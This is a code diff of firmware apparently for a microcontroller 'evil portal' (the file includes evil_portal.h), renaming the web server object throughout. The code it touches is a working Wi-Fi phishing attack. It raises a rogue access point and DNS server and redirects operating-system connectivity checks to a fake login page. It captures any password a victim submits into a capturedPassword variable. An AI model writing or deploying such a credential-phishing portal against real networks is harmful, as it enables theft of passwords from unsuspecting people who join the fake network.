@@ -6,7 +6,7 @@
 #include "evil_portal.h"
 
 DNSServer dnsServer;
-AsyncWebServer server(80);
+AsyncWebServer async_server(80);
 
 bool portalRunning = false;
 bool isCaptured = false;
@@ -65,21 +65,21 @@ void setUpDNSServer() {
 }
 
 void setUpWebserver() {
-  server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
-  server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
-  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
-  server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
-  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });
-  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
-  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });
-  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });
-  server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });
+  async_server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
+  async_server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
+  async_server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
+  async_server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
+  async_server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });
+  async_server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
+  async_server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });
+  async_server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });
+  async_server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });
 
-  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
+  async_server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
     request->send(200, "text/html", index_html);
   });
 
-  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
+  async_server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
     if (request->hasParam("password", true)) {
       capturedPassword = request->getParam("password", true)->value();
       request->send(200, "text/html", "<h2>Connecting to network...</h2>");
@@ -88,7 +88,7 @@ void setUpWebserver() {
     }
   });
 
-  server.onNotFound([](AsyncWebServerRequest *request) {
+  async_server.onNotFound([](AsyncWebServerRequest *request) {
     request->redirect(localIPURL);
   });
 }
@@ -101,7 +101,7 @@ void startCaptivePortal(String* ssid) {
   startSoftAccessPoint();
   setUpDNSServer();
   setUpWebserver();
-  server.begin();
+  async_server.begin();
   
   portalRunning = true;
 }
@@ -110,7 +110,7 @@ void stopCaptivePortal() {
   if (!portalRunning) return;
   
   dnsServer.stop();
-  server.end();
+  async_server.end();
 
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_MODE_NULL);
